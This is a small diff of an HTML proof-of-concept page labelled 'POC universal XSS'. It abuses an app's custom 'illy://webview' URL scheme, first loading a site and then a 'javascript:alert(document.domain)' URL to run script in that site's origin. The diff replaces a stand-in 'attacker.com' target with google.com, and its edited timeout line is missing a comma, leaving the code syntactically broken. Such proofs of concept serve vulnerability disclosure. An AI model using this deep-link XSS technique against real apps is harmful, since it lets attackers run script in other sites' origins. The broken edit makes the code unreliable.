@@ -4,12 +4,12 @@
 		<h1> POC universal XSS</h1>
 <script>
 location.href =
-"illy://webview?url=https://attacker.com";
+"illy://webview?url=https://google.com";
 
 setTimeout(()=>{
  location.href =
  "illy://webview?url=javascript:alert(document.domain)";
-},3000);
+}6000);
 </script>
 	</body>
 </html>
